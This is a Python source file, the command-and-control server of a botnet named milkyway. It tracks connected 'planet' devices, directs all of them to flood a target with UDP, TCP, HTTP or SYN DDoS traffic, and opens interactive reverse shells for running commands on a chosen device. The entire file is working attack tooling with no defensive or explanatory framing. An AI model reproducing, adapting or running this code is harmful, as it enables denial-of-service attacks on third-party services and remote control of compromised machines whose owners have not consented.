#!/usr/bin/env python3

"""galaxy.py: The milkyway server software."""

# import libraries
import os
import secrets
import socket
import sys
import threading
import time
from signal import signal, SIGINT

# get platform
if sys.platform in ("linux", "linux2"):
    galaxy_os = "linux"
elif sys.platform == "darwin":
    galaxy_os = "mac"
elif sys.platform == "win32":
    galaxy_os = "windows"
else:
    print("This platform is unsupported.")
    os._exit(0)


# functions
def exit_handler(*args):
    """Ensure a safe and smooth exit."""
    global galaxy_online
    galaxy_online = False
    galaxy_socket.close()
    if "cmd" in args:
        print("| Exiting...")
    else:
        print("\nExiting...")
    os._exit(0)


def clear():
    """Clear the screen."""
    if galaxy_os in ("linux", "mac"):
        os.system("/usr/bin/clear")
    elif galaxy_os == "windows":
        os.system("cls")


def bind_port():
    """Bind to a specified port and begin listening for connections."""
    global galaxy_online, shell_socket, galaxy_socket
    while not galaxy_online:
        try:
            galaxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_socket = socket.socket()
            galaxy_socket.bind(("0.0.0.0", galaxy_port))
            shell_socket.bind(("0.0.0.0", shell_port))
            galaxy_socket.listen()
            shell_socket.listen()
            galaxy_socket.settimeout(0.5)
            shell_socket.settimeout(0.5)
            galaxy_online = True
        except OSError as e:
            if str(e) == "[Errno 98] Address already in use":
                print(
                    f"ERROR: Port {galaxy_port} is already in use. Retrying in 5 seconds..."
                )
                time.sleep(5)
            else:
                raise e


def planet_handler():
    """Handle connections of remote devices."""
    while galaxy_online:
        try:
            planet, addr = galaxy_socket.accept()
            planets.append(planet)
            planet_ips.append(addr)
            planet_id = secrets.token_hex(10)
            planet_ids.append(planet_id)
            planet.send(f"planet ID: {planet_id}".encode())
            print(type(planet))
        except TimeoutError:
            pass
        except OSError as e:
            if "Bad file descriptor" in str(e):
                break
            else:
                raise e
        for handler_i, planet in enumerate(planets):
            try:
                data = planet.recv(1024).decode("ascii").lower().strip()
                if not data:
                    pass
                elif "offline" in data:
                    del planets[handler_i]
                    del planet_ips[handler_i]
                    del planet_ids[handler_i]
                elif "stopping attack" in data:
                    planets_attacking.remove(planet)
            except BrokenPipeError:
                del planets[handler_i]
                del planet_ips[handler_i]
                del planet_ids[handler_i]


def ddos(cmd_ddos):
    """Initiate a DDoS attack using remote devices."""
    global planets_attacking
    if len(planets) == 0:
        print("| ERROR: There are no planets connected to attack with.")
        return
    if cmd_ddos != "ddos stop":
        try:
            targetAddr, targetPort, floodType = (
                cmd_ddos.replace("ddos ", "").strip().split()
            )
        except ValueError:
            print("| ERROR: One or more arguments not specified.")
            return
    else:
        for ddos_i, planet in enumerate(planets_attacking):
            try:
                planet.send(cmd_ddos.encode())
            except BrokenPipeError:
                del planets[ddos_i]
                del planet_ips[ddos_i]
                del planet_ids[ddos_i]
        print("| Attack successfully stopped.")
        return
    if floodType not in ("udp", "tcp", "http", "syn"):
        print("| ERROR: Invalid attack type. Please enter a valid attack type.")
        return
    try:
        targetPort = int(targetPort)
    except ValueError:
        print("| ERROR: Invalid port. Please enter a valid number.")
        return
    try:
        trimmedAddr = (
            targetAddr.replace("https://", "")
            .replace("http://", "")
            .replace("www.", "")
        )
        targetAddr = socket.gethostbyname(trimmedAddr)
    except socket.gaierror:
        print(
            "| ERROR: Invalid address. Please enter a valid and online domain or IPv4 address."
        )
        return
    if floodType == "udp":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    elif floodType in ("tcp", "http"):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    else:
        s = socket.socket()
    try:
        s.connect((targetAddr, targetPort))
        s.close()
    except ConnectionRefusedError:
        print("| ERROR: Invalid port. Please enter an open port.")
        return
    planet_msg = f"ddos {targetAddr} {targetPort} {floodType}"
    planets_attacking = planets
    for ddos_i, planet in enumerate(planets_attacking):
        try:
            planet.send(planet_msg.encode())
        except BrokenPipeError:
            del planets[ddos_i]
            del planet_ips[ddos_i]
            del planet_ids[ddos_i]
    print("| Attack successfully started.")


def shell(cmd_shell):
    """Establish a reverse shell with a remote device."""
    shell_buf_size = 128
    new_cmd = cmd_shell.replace("shell ", "").strip().split()
    if len(new_cmd) == 1:
        shelled_planet_id = new_cmd
    else:
        shelled_planet_id, shell_buf_size = new_cmd
    shelled_planet_id = (
        str(shelled_planet_id).replace("['", "").replace("']", "").strip()
    )
    if shelled_planet_id not in planet_ids:
        print("| ERROR: The planet ID specified does not exist.")
        shell_socket.close()
        return
    shell_buf_size = int(
        str(shell_buf_size).replace("['", "").replace("']", "").strip()
    )
    shelled_planet = planets[int(planet_ids.index(shelled_planet_id))]
    shell_buf_size = shell_buf_size * 1024
    shelled_planet.send(f"shellcmd start bufsize {shell_buf_size}".encode())
    while True:
        try:
            shell_planet, _ = shell_socket.accept()
            shelled_planet_cwd = shell_planet.recv(shell_buf_size).decode()
            break
        except OSError as e:
            if "Bad file descriptor" in str(e):
                return
            else:
                raise e
    clear()
    print(milkyway_logo)
    print("Type 'exit' to leave shell.")
    print("NOTE: Commands that require input will not work!\n")
    planets_shelled.append(shelled_planet)
    while shelled_planet in planets:
        shell_cmd = input(f"{shelled_planet_id} | {shelled_planet_cwd} > ")
        shell_cmd = f"{shell_cmd}"
        shell_planet.send(shell_cmd.encode())
        if shell_cmd.lower() == "exit":
            clear()
            print(milkyway_logo)
            print("Type 'help' for a list of commands.\n")
            shell_socket.close()
            break
        output = shell_planet.recv(shell_buf_size).decode()
        result, shelled_planet_cwd = output.split("<sep>")
        print(result)
    if shelled_planet not in planets:
        clear()
        print(milkyway_logo)
        print("ERROR: Shelled planet is now offline.")
        print("Type 'help' for a list of commands.\n")
        shell_socket.close()
    planets_shelled.remove(shelled_planet)


# logo
milkyway_logo = """
||||||||||| ||||||||| |||       |||   ||| |||   ||| ||| ||| ||| ||||||||| |||   |||
||| ||| |||    |||    |||       ||||||    ||||||||| ||| ||| ||| |||   ||| |||||||||
||| ||| |||    |||    |||       |||   |||    |||    ||| ||| ||| |||||||||    |||
||| ||| ||| ||||||||| ||||||||| |||   |||    |||    ||||||||||| |||   |||    |||
"""


# exit handler
signal(SIGINT, exit_handler)


# variables
galaxy_port = 9999
galaxy_socket = ""
shell_port = 10000
shell_socket = ""
planets = []
planet_ips: list[tuple]
planet_ips = []
planet_ids: list[str]
planet_ids = []
planets_shelled = []
planets_attacking = []
galaxy_online = False


# bind to port
bind_port()
threading.Thread(target=planet_handler).start()


# main stuff
clear()
print(milkyway_logo)
print("Type 'help' for a list of commands.\n")
while True:
    cmd = input("> ")
    if cmd == "help":
        print("| ddos <address> <port> <type>")
        print("| |-> Launches a DDoS attack using all connected planets.")
        print("| |-> Address must either be a domain, or an IPv4 address.")
        print("| |-> Types: tcp, http, udp, syn")
        print("| shell <planet-id> <buffer-size>")
        print("| |-> Opens a reverse shell on a the specified planet.")
        print(
            "| |-> Buffer size is measured in KB. If not specified, it will be set to 128KB."
        )
        print("| list")
        print("| |-> Lists all connected planets.")
        print("| exit")
        print("| |-> Exits milkyway.")
    elif cmd == "list":
        if len(planets) > 0:
            print("| Connected planets:")
            for i, planet_ip in enumerate(planet_ips):
                planet_ip_list = list(planet_ip)
                planet_ip_port = f"{planet_ip_list[0]}:{planet_ip_list[1]}"
                print(f"| {i + 1}. IP/Port: {planet_ip_port} | ID: {planet_ids[i]}")
        else:
            print("| There are no planets connected.")
    elif cmd == "exit":
        exit_handler("", "", "cmd")
    elif "ddos" in cmd:
        ddos(cmd)
    elif "shell" in cmd:
        shell(cmd)
    else:
        print("| Invalid command.")
